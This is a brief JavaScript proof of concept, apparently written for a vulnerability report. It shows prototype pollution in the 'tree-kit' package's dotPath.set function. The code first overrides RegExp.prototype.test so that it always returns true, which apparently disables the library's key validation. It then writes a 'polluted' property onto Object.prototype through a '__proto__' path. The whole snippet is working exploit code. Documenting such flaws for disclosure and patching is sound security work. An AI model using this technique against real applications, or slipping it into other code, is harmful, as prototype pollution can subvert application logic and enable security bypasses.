RegExp.prototype.test = () => true;
const {dotPath} = require('tree-kit');
obj = {};
console.log({}.polluted);
dotPath.set({}, [
    '__proto__',
    'polluted'
], 'yes');
console.log({}.polluted);